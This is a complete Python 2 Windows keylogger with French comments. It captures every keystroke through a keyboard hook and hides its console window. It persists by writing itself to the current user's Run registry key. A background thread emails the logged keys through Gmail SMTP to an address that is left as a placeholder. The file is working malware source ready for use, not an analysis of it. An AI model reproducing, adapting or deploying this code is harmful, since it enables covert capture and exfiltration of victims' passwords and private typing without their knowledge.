try:
    import pythoncom, pyHook
except:
    print "Les modules pywin32 et pyHook sont requis pour poursuivre l'execution.\nExit."
    exit(0)

import os
import sys
import threading
import urllib,urllib2
import smtplib
import datetime,time
import win32event, win32api, winerror
from _winreg import *


# Interdiction de plusieurs instanciations
# Processus mutex : filtre
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Instanciations multiples interdit."
    exit(0)
data = ''
count = 0


# Dissimule la console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True


# Persistance
def persistance():
    ch = os.path.dirname(os.path.realpath('__file__'))
    nom_fichier = sys.argv[0].split("\\")[-1]
    nouveau_chemin = ch + "\\" + nom_fichier
    # Pointage vers le répertoire permettant l'ajout de programme au démarrage
    clefVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    # Arborescence principale | chemin de la clef en base de registre == Utilisateur courant
    clef_base_registre = OpenKey(HKEY_CURRENT_USER,clefVal,0,KEY_ALL_ACCESS)
    # Ajout de la clef
    SetValueEx(clef_base_registre, "FabVinKevJim-key",0,REG_SZ, nouveau_chemin)


# Envoie des logs par mail (Thread pour plus de dynamisme sans affecter la mémoire vive)
class TimerClass(threading.Thread):
    # Instanciation du Thread d'écoute, de comptage et d'envoie des évenements
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()
    # Méthode élémentaire du Thread : définition des envois
    def run(self):
        while not self.event.is_set():
            # Data == enregistrement des touches préssées
            global data
            if len(data) > 100:
                # Envoie de la data enregistrée tous les 100 caractères
                ts = datetime.datetime.now()
                SERVER = "smtp.gmail.com"
                PORT = 587
                USER = "xxxxxxx@gmail.com" # à modifier
                PASS = "xxxxxxx" # à modifier
                FROM = USER
                TO = ["xxxxxxxxx@gmail.com"] # à modifier
                SUBJECT = "Keylogger sniff : " + str(ts)
                MESSAGE = data
                message = """\
                        From: %s
                        To: %s
                        Subject: %s
                        %s
                        """ % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
                try:
                    server = smtplib.SMTP()
                    server.connect(SERVER,PORT)
                    server.starttls()
                    server.login(USER,PASS)
                    server.sendmail(FROM, TO, message)
                    data = ''
                    server.quit()
                except Exception as e:
                    print e
                    print "Problème envoie de MAIL > dist\\KV.exe.logs"
            self.event.wait(120)


# Identification des touches (stdin == clavier)
def pression(event):
    global data
    if event.Ascii==13:
        touche = '<ENTREE>'
    elif event.Ascii==8:
        touche = '<BACK SPACE>'
    elif event.Ascii==9:
        touche = '<TAB>'
    else:
        touche = chr(event.Ascii)
    data += touche


# Main
def main():
    persistance()
    hide()
    email = TimerClass()
    email.start()
    return True


if __name__ == '__main__':
    main()


# Lancement : réception du signal des touches
obj = pyHook.HookManager()
obj.KeyDown = pression
obj.HookKeyboard()
pythoncom.PumpMessages()
